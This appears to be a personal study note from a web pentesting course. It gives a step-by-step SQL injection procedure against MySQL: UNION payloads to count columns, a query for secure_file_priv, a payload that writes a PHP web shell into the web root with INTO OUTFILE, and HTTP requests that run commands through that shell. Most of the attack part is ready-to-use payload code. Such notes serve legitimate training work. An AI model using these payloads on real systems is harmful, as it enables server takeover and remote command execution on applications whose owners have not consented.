
## SELECT INTO OUTFILE

- We take export data from the table and store into a output file locally. We need to specify the output file path.

```mysql
SELECT * FROM <table_name> INTO OUTFILE '<output file>';
```

## Write into Files

```mysql
SELECT '<message>' INTO OUTFILE ''
```


---
## Database Exploitation

### Read the Rules Before Injecting Payload

[[Web Pentesting/HTB/Server Side Attacks/SQL Injection/Exploitation/Database Enumeration/Commands|Commands]]




### STEP 1 -> Check Number of Columns

- It works opposite to `ORDER BY`. We need to keep doing it until we get a success message. So if we get success at **4**, then there are 4 columns but their display order can vary. Some columns might not be displayed but are returned during query.

```mysql
cn' UNION SELECT 1,2,3,4-- '
```


### STEP 2 -> Payload to check value of secure_file_priv

- Determines where to read/write files from.
- Empty value => read/write all files. `NULL` value => cannot read/write files. Otherwise directory specified from where we can read/write particularly.

```mysql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

### STEP 3 -> Payload to Write Web Shell into Target Web Directory of the Web Server using SQL injection

- The `/var/www/html/shell.php` is a placeholder for the web root directory for the web application. Otherwise we can try checking with `/var/www/html/shell.php` as well.
- We can find the base web directory by `load_file` to read server configuration. Checkout how to **Read** a file using SQL payloads.
- **Note:** To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use `load_file` to read the server configuration, like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using [this wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or [this wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.
 
```mysql
cn' UNION SELECT "", "", "<?php system($_REQUEST[0]); ?>", "" INTO OUTFILE '<web_root_directory>/shell.php' -- -
```

### STEP 4 -> Running commands in WebShell

- We will supply commands to check whether our webshell works or not.
- Now lets say the web root directory was `/var/www/html/shell.php` or **something**. There will be a parameter `0` as you can see in the above **php** code. Beside the `0` parameter we need to give our commands as shown below.
- Again I must say `/var/www/html/shell.php` might change as web root directory varies in each application. Here its used as a placeholder to demonstrate.

```http
http://<target IP>:<PORT>/shell.php?0=<command>
```



